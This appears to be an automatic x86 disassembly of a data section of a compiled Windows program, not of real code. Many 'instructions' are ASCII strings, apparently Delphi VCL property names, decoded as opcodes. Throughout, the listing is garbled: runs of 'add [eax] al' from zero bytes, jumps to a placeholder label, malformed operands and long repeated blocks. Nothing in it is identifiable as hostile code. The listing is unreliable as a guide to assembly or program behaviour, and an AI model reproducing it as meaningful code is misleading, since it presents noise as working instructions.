je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
jo r-xdata
push ebp
push ebp
jo r-xdata
arpl [ ebx + 0x2c ] bp
pop ebx
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
inc esp
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add al cl
sbb al [ ebx ]
je r-xdata
outsb
dec edi
loopne r-xdata
add [ eax ] al
jmp eax
add [ eax ] eax
mov esp 0xe8004359
or [ edi ] dl
pop ecx
inc ebx
add al bl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060028 ] al
outsb
inc ebp
js r-xdata
add [ eax + 0x4f090025 ] al
outsb
inc ebp
outsb
inc esp
pop ebx
inc ebx
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
and [ eax ] eax
pop es
dec edi
pop edx
inc ebx
add al ch
add [ eax ] al
add [ esi + eax * 8 ] ch
inc ebx
add [ esi + eax * 2 + 0x41 ] dl
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
pop ebp
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002f ] al
outsb
push ebx
je r-xdata
add [ ebx + ebx ] al
jb r-xdata
pop eax
push es
add al ah
cmp al 0x43
add al ah
fiadd [ ebx ]
cmp al 0x3d
inc ebx
add [ eax - 0x6bffbc1e ] dl
loop r-xdata
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
shr al 0x1
inc ebx
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
test al 0xcb
inc ebx
add [ eax + 0x18 ] dh
inc esp
add [ eax + 0x540043e0 ] bl
inc esi
inc ecx
add [ eax ] bl
adc [ ebx ] eax
shl [ ecx + 0x33ec0041 ] 0x40
je r-xdata
push ebx
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
inc ebx
add al ah
inc ebx
add [ eax - 0x66 ] al
inc ebx
add [ ebp + ecx * 8 + 0x43 ] cl
add [ eax - 0x5d ] bl
inc ebx
add al bl
mov eax [ 0xffffffff9ec00041 ]
sub al 0xc6
or [ fs : ebx + 0x74 ] dl
inc ebx
je r-xdata
inc edi
jb r-xdata
or [ fs : ebx + 0x62 ] ah
jb r-xdata
adc al 0x2
add [ eax ] al
sbb [ ecx ] dl
inc ebx
add al al
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
insb
sbb al 0x43
outsd
add [ esp + edi + 0x43 ] al
add al bl
cmp eax [ ebx ]
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
and [ esi ] bh
inc ebx
add [ ecx + 0x43 ] cl
add ah dh
loopne r-xdata
mov eax [ 0x33ec0041 ]
inc eax
outsb
arpl [ eax + 0x65 ] bp
arpl [ ebx + 0x65 ] bp
or [ fs : ebx + 0x62 ] esp
inc ebx
push 0x656b6365
or [ fs : ebx + 0x62 ] ah
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + ebx + 0x43 ] bl
add [ ebx ] cl
arpl [ edx + 0x55 ] sp
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0x3b6c0041 ]
inc ebx
add [ ebx + edx + 0x18a00044 ] al
inc esp
add ah ch
pop ss
inc esp
add [ eax + ebx * 4 + 0xe000043 ] dh
inc esp
add [ eax ] ah
push cs
inc esp
add [ eax ] bh
or eax [ eax + eax - 0x4 ]
xchg edi eax
inc ebx
add [ eax ] al
cwde
inc ebx
add ah bh
mov [ ebx ] sub_43c828
inc eax
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ esp + 0x43 ] al
add [ eax - 0x59 ] bl
inc ebx
add [ esi ] al
inc ebx
add [ eax ] cl
aaa
inc ebx
add [ eax + ecx * 8 + 0xb8c0043 ] ch
inc esp
add [ eax + 0xc ] cl
inc esp
add [ edi + eax + 0x44 ] al
add [ esp + ecx ] ch
inc esp
add ah al
int 0x43
add [ eax - 0x2c ] bl
inc ebx
add al bh
loope r-xdata
sahf
insb
jae r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
inc eax
add ah dh
sbb [ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x1b
inc esp
out dx al
sbb al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x431a 0x0
pushad
sbb [ ebx ] eax
add ecx [ esi ]
push esp
inc ebx
push 0x426b6365
outsd
js r-xdata
imul eax [ edx + 0x6f ] 0x78
mov eax eax
jl r-xdata
add al ah
cmp al 0x43
add al ah
fiadd [ ebx ]
cmp al 0x3d
inc ebx
add [ eax - 0x6bffbc1e ] dl
loop r-xdata
inc ebx
rol [ ebx + ebx ] 0x43
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
fdivr [ ebx ]
inc ebx
add [ edi ] cl
push esp
inc ebx
jne r-xdata
mov al 0x11
mov ebp 0xffcaffeb
push 0x7c00433d
cmp eax 0x3d840043
inc ebx
add [ eax ] ah
inc ebx
add [ ebp + ecx + 0x44 ] ch
add [ ebx + ebp * 8 ] bh
inc ebx
add [ esi + ebx + 0x9e80044 ] ch
inc esp
add al bl
or al 0x44
add [ eax + 0x3c ] bl
inc ebx
add [ eax + 0x3c ] bh
inc ebx
add [ esp + edi ] al
inc ebx
add [ esi ] al
add [ 0x6b01000 ] al
outsd
je r-xdata
inc ebx
add [ edi ] al
js r-xdata
add [ ecx + 0x43 ] cl
add ah dh
loopne r-xdata
add [ ebx + ebx * 4 ] dl
outsd
add [ eax ] al
je r-xdata
add [ ecx ] ah
add bh bh
les ebx [ eax - 0x669fffbd ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
sldt [ edi ]
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
insb
jae r-xdata
inc esp
add ah al
int 0x43
add [ eax - 0x2c ] bl
inc ebx
add al bh
loope r-xdata
sub al 0xc
sbb eax [ ebx ]
add [ ebx ] bl
inc ebx
add [ esi ] dh
add [ eax ] cl
push ebx
je r-xdata
add [ ebp + ecx + 0x44 ] ch
add [ ebx + ebp * 8 ] bh
inc ebx
add [ esi + ebx + 0x9e80044 ] ch
inc esp
add al bl
or al 0x44
add [ eax + 0x3c ] bl
inc ebx
add [ eax + 0x3c ] bh
inc ebx
add [ esp + edi ] al
inc ebx
add [ ecx ] cl
push esp
inc ebx
push 0x426b6365
outsd
js r-xdata
je r-xdata
sbb [ ebx ] eax
pushad
adc al [ ebx ]
or al 0x0
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ eax ] al
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
sub al 0xa7
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050013 ] al
outsd
insb
outsd
jb r-xdata
rcl [ 0x5f0041 ] 0x0
push [ eax ]
add dh bh
xchg esp eax
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080010 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2465646f
push edi
cmp al 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax 0x6c410900
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ebx + ebp + 0x41 ] ch
add [ eax + eax ] bh
add dh bh
in al 0x98
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000c ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
cwde
adc eax 0x2100041
add bh bh
cmp al 0x43
push cs
add [ ebx ] cl
inc ecx
insb
insb
outsd
ja r-xdata
inc ebx
add [ eax - 0x59 ] bl
inc ebx
add [ esi ] al
inc ebx
add [ eax ] cl
aaa
inc ebx
add [ eax + ecx * 8 + 0xb8c0043 ] ch
inc esp
add [ eax + 0xc ] cl
inc esp
add [ edi + eax + 0x44 ] al
add [ esp + ecx ] ch
inc ebx
or [ ebx + eax * 2 + 0x68 ] edx
arpl [ gs : ebx + 0x42 ] bp
outsd
sar [ esp + ebx + 0x43 ] 0x0
pop es
inc ecx
add ah dh
xor eax [ eax ]
shr al 0x1
inc ebx
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
test al 0xcb
inc ebx
add [ eax + 0x18 ] dh
add ah ch
xor eax [ eax ]
adc al 0x9b
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
jo r-xdata
insb
jae r-xdata
jae r-xdata
pop eax
inc ebx
add [ eax + eax ] dh
inc [ edx + ecx * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0014 ] al
outsd
outsb
jae r-xdata
push cs
inc esp
add [ esi + ecx + 0x44 ] bh
add [ eax - 0x80000000 ] al
adc eax 0x74430500
insb
imul ebp [ edi + 0x6e ] r-xdata
enter 0x0 0xfe
int3
inc ebx
add [ eax - 0x5b ] dh
inc ebx
add [ eax + 0x6c0043a5 ] ah
lds eax [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
pop es
outsd
and al 0x57
jb r-xdata
inc ebx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0x3b6c0041 ]
inc ebx
add [ ebx + edx + 0x18a00044 ] al
inc esp
add ah ch
pop ss
inc esp
add [ eax + ebx * 4 + 0xe000043 ] dh
inc esp
add [ eax ] ah
push cs
inc esp
add [ eax ] bh
or eax [ eax + eax - 0x4 ]
xchg edi eax
inc ebx
add [ eax ] al
cwde
inc ebx
add ah bh
mov [ ebx ] sub_43c828
inc eax
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ esp + 0x43 ] al
inc esp
add [ eax + 0x540043e0 ] bl
inc esi
inc ecx
add [ esi + eax * 8 ] ch
inc ebx
add [ eax - 0x66 ] al
inc ebx
add [ ebp + ecx * 8 + 0x43 ] cl
add [ eax - 0x5d ] bl
add [ eax ] dl
inc eax
add [ ecx + eax + 0xf8cff00 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ edi + ecx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
[ eax - 0x43ffbbf2 ]
push cs
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050015 ] al
je r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
push ss
add [ edx ] cl
inc esp
jb r-xdata
inc ebx
add [ edi ] al
jns r-xdata
sbb eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
dec [ ebp + eax * 8 + 0x43 ]
add [ eax + 0x1 ] al
add [ gs : eax ] dl
xor eax [ esp + edi + 0x50 ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
pop ss
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x6700ffff ] ah
sbb [ eax ] eax
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
push esp
mov ch 0x41
add [ eax ] ch
add [ eax ] eax
add [ eax ] al
inc ebx
jne r-xdata
jl r-xdata
inc ecx
add [ eax ] bl
add al [ eax ]
add [ eax - 0x3fffbce7 ] ch
mov eax [ 0x33ec0041 ]
inc eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx + 0x43 ] ch
outsd
outsb
je r-xdata
sbb [ edx ] 0x0
add al 0x46
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jmp [ esi + 0x43 ]
jae r-xdata
popad
jo r-xdata
add [ eax ] al
add [ eax + 0x43070011 ] al
inc ebx
add bh bh
cmpsb [ fs : esi ] [ edi ]
inc ebx
add [ esi + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001a ] al
jb r-xdata
push esi
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub_43183d
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
dec ebx
jns r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
loopne r-xdata
jo r-xdata
pop ecx
inc ebx
add al bl
add [ eax ] al
or [ edx + 0x43 ] bl
add al ah
add [ eax ] eax
jmp eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add al ch
add [ eax ] eax
pop eax
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
dec ebp
outsd
jne r-xdata
push ebp
push ebp
jo r-xdata
arpl [ ebx + 0x2c ] bp
pop ebx
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
inc esp
outsd
ja r-xdata
inc ebx
add [ esi + eax * 2 + 0x41 ] dl
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
push ebx
je r-xdata
pop ebp
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002f ] al
outsb
push ebx
je r-xdata
add [ esi + eax * 8 ] ch
add [ ebx + ebx ] al
jb r-xdata
pop eax
push es
add al ah
cmp al 0x43
add al ah
fiadd [ ebx ]
cmp al 0x3d
inc ebx
add [ eax - 0x6bffbc1e ] dl
loop r-xdata
inc ebx
add [ eax - 0x66 ] al
inc ebx
add [ ebp + ecx * 8 + 0x43 ] cl
add [ eax - 0x5d ] bl
inc ebx
add al bl
mov eax [ 0xffffffff9ec00041 ]
sub al 0xc6
or [ fs : ebx + 0x74 ] dl
inc ebx
je r-xdata
inc edi
jb r-xdata
or [ fs : ebx + 0x62 ] ah
jb r-xdata
adc al 0x2
add [ eax ] al
sbb [ ecx ] dl
inc ebx
add al al
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
insb
sbb al 0x43
outsd
add [ esp + edi + 0x43 ] al
add al bl
cmp eax [ ebx ]
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
and [ esi ] bh
inc ebx
add [ ecx + 0x43 ] cl
add ah dh
loopne r-xdata
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0x3b6c0041 ]
inc ebx
add [ ebx + edx + 0x18a00044 ] al
inc esp
add ah ch
pop ss
inc esp
add [ eax + ebx * 4 + 0xe000043 ] dh
inc esp
add [ eax ] ah
push cs
inc esp
add [ eax ] bh
or eax [ eax + eax - 0x4 ]
xchg edi eax
inc ebx
add [ eax ] al
cwde
inc ebx
add ah bh
mov [ ebx ] sub_43c828
inc eax
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ esp + 0x43 ] al
add [ eax - 0x59 ] bl
inc ebx
add [ esi ] al
inc ebx
add [ eax ] cl
aaa
inc ebx
add [ eax + ecx * 8 + 0xb8c0043 ] ch
inc esp
add [ eax + 0xc ] cl
inc esp
add [ edi + eax + 0x44 ] al
add [ esp + ecx ] ch
inc esp
add ah al
int 0x43
add [ eax - 0x2c ] bl
inc ebx
add al bh
loope r-xdata
sahf
insb
jae r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
inc eax
add ah dh
sbb [ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x1b
inc esp
out dx al
sbb al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x431a 0x0
pushad
sbb [ ebx ] eax
add ecx [ esi ]
push esp
inc ebx
push 0x426b6365
outsd
js r-xdata
imul eax [ edx + 0x6f ] 0x78
mov eax eax
jl r-xdata
add al ah
cmp al 0x43
add al ah
fiadd [ ebx ]
cmp al 0x3d
inc ebx
add [ eax - 0x6bffbc1e ] dl
loop r-xdata
inc ebx
rol [ ebx + ebx ] 0x43
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
fdivr [ ebx ]
inc ebx
add [ edi ] cl
push esp
inc ebx
jne r-xdata
mov al 0x11
mov ebp 0xffcaffeb
push 0x7c00433d
cmp eax 0x3d840043
inc ebx
add [ eax ] ah
inc ebx
add [ ebp + ecx + 0x44 ] ch
add [ ebx + ebp * 8 ] bh
inc ebx
add [ esi + ebx + 0x9e80044 ] ch
inc esp
add al bl
or al 0x44
add [ eax + 0x3c ] bl
inc ebx
add [ eax + 0x3c ] bh
inc ebx
add [ esp + edi ] al
inc ebx
add [ esi ] al
add [ 0x6b01000 ] al
outsd
add [ eax ] al
add [ eax ] al
add al cl
sbb al [ ebx ]
je r-xdata
je r-xdata
inc ebx
add [ edi ] al
js r-xdata
add [ ecx + 0x43 ] cl
add ah dh
loopne r-xdata
add [ ebx + ebx * 4 ] dl
outsd
add [ eax ] al
je r-xdata
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
shr al 0x1
inc ebx
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
test al 0xcb
inc ebx
add [ eax + 0x18 ] dh
inc esp
add [ eax + 0x540043e0 ] bl
inc esi
inc ecx
add [ eax ] bl
adc [ ebx ] eax
shl [ ecx + 0x33ec0041 ] 0x40
je r-xdata
add [ ecx ] ah
add bh bh
les ebx [ eax - 0x669fffbd ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
sldt [ edi ]
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
insb
jae r-xdata
inc esp
add ah al
int 0x43
add [ eax - 0x2c ] bl
inc ebx
add al bh
loope r-xdata
sub al 0xc
sbb eax [ ebx ]
add [ ebx ] bl
inc ebx
add [ esi ] dh
add [ eax ] cl
push ebx
je r-xdata
add [ ebp + ecx + 0x44 ] ch
add [ ebx + ebp * 8 ] bh
inc ebx
add [ esi + ebx + 0x9e80044 ] ch
inc esp
add al bl
or al 0x44
add [ eax + 0x3c ] bl
inc ebx
add [ eax + 0x3c ] bh
inc ebx
add [ esp + edi ] al
inc ebx
add [ ecx ] cl
push esp
inc ebx
push 0x426b6365
outsd
js r-xdata
je r-xdata
sbb [ ebx ] eax
pushad
adc al [ ebx ]
or al 0x0
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ eax ] al
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
mov eax [ 0x33ec0041 ]
inc eax
outsb
arpl [ eax + 0x65 ] bp
arpl [ ebx + 0x65 ] bp
or [ fs : ebx + 0x62 ] esp
inc ebx
push 0x656b6365
or [ fs : ebx + 0x62 ] ah
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + ebx + 0x43 ] bl
add [ ebx ] cl
arpl [ edx + 0x55 ] sp
sub al 0xa7
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050013 ] al
outsd
insb
outsd
jb r-xdata
rcl [ 0x5f0041 ] 0x0
push [ eax ]
add dh bh
xchg esp eax
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080010 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2465646f
push edi
cmp al 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax 0x6c410900
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ebx + ebp + 0x41 ] ch
add [ eax + eax ] bh
add dh bh
in al 0x98
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000c ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
cwde
adc eax 0x2100041
add bh bh
cmp al 0x43
push cs
add [ ebx ] cl
inc ecx
insb
insb
outsd
ja r-xdata
inc ebx
add [ eax - 0x59 ] bl
inc ebx
add [ esi ] al
inc ebx
add [ eax ] cl
aaa
inc ebx
add [ eax + ecx * 8 + 0xb8c0043 ] ch
inc esp
add [ eax + 0xc ] cl
inc esp
add [ edi + eax + 0x44 ] al
add [ esp + ecx ] ch
inc ebx
or [ ebx + eax * 2 + 0x68 ] edx
arpl [ gs : ebx + 0x42 ] bp
outsd
sar [ esp + ebx + 0x43 ] 0x0
pop es
inc ecx
add ah dh
xor eax [ eax ]
shr al 0x1
inc ebx
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
test al 0xcb
inc ebx
add [ eax + 0x18 ] dh
add ah ch
xor eax [ eax ]
adc al 0x9b
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
jo r-xdata
insb
jae r-xdata
jae r-xdata
pop eax
inc ebx
add [ eax + eax ] dh
inc [ edx + ecx * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0014 ] al
outsd
outsb
jae r-xdata
push cs
inc esp
add [ esi + ecx + 0x44 ] bh
add [ eax - 0x80000000 ] al
adc eax 0x74430500
insb
imul ebp [ edi + 0x6e ] r-xdata
enter 0x0 0xfe
int3
inc ebx
add [ eax - 0x5b ] dh
inc ebx
add [ eax + 0x6c0043a5 ] ah
lds eax [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
pop es
outsd
and al 0x57
jb r-xdata
inc ebx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0x3b6c0041 ]
inc ebx
add [ ebx + edx + 0x18a00044 ] al
inc esp
add ah ch
pop ss
inc esp
add [ eax + ebx * 4 + 0xe000043 ] dh
inc esp
add [ eax ] ah
push cs
inc esp
add [ eax ] bh
or eax [ eax + eax - 0x4 ]
xchg edi eax
inc ebx
add [ eax ] al
cwde
inc ebx
add ah bh
mov [ ebx ] sub_43c828
inc eax
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ esp + 0x43 ] al
inc esp
add [ eax + 0x540043e0 ] bl
inc esi
inc ecx
add [ esi + eax * 8 ] ch
inc ebx
add [ eax - 0x66 ] al
inc ebx
add [ ebp + ecx * 8 + 0x43 ] cl
add [ eax - 0x5d ] bl
add [ eax ] dl
inc eax
add [ ecx + eax + 0xf8cff00 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ edi + ecx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
[ eax - 0x43ffbbf2 ]
push cs
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050015 ] al
je r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
push ss
add [ edx ] cl
inc esp
jb r-xdata
inc ebx
add [ edi ] al
jns r-xdata
sbb eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
dec [ ebp + eax * 8 + 0x43 ]
add [ eax + 0x1 ] al
add [ gs : eax ] dl
xor eax [ esp + edi + 0x50 ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
pop ss
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x6700ffff ] ah
sbb [ eax ] eax
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
push esp
mov ch 0x41
add [ eax ] ch
add [ eax ] eax
add [ eax ] al
inc ebx
jne r-xdata
jl r-xdata
inc ecx
add [ eax ] bl
add al [ eax ]
add [ eax - 0x3fffbce7 ] ch
mov eax [ 0x33ec0041 ]
inc eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx + 0x43 ] ch
outsd
outsb
je r-xdata
sbb [ edx ] 0x0
add al 0x46
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jmp [ esi + 0x43 ]
jae r-xdata
popad
jo r-xdata
add [ eax ] al
add [ eax + 0x43070011 ] al
inc ebx
add bh bh
cmpsb [ fs : esi ] [ edi ]
inc ebx
add [ esi + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001a ] al
jb r-xdata
push esi
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub_4322a4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call sub_4365d8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x23d60043 ] bh
inc ebx
add [ edx + eax ] dl
add [ eax ] al
sbb [ ecx ] dl
inc ebx
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
shr al 0x1
inc ebx
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
test al 0xcb
inc ebx
add [ eax + 0x18 ] dh
inc esp
add [ eax + 0x540043e0 ] bl
inc esi
inc ecx
add [ esi + eax * 8 ] ch
inc ebx
add [ eax - 0x66 ] al
inc ebx
add [ ebp + ecx * 8 + 0x43 ] cl
add [ eax - 0x5d ] bl
inc ebx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0x3e300041 ]
inc ebx
add [ ebx + edx + 0x18a00044 ] al
inc esp
add ah ch
pop ss
